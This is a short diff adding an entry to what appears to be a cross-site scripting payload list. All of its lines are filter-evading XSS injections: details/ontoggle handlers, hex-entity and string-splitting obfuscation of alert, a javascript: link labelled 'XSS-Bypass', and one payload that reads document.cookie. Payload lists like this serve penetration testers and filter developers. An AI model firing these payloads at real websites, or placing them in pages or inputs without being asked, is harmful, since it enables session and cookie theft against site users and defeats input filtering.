@@ -1,6 +1,7 @@
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
+'<00 foo="<a%20href="javascript​:alert('XSS-Bypass')">XSS-CLick</00>--%20/
 ';k='e'%0Atop['al'+k+'rt'](1)//
 “>-setTimeout`\u0028alert(1)\u0029`-’
 '"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
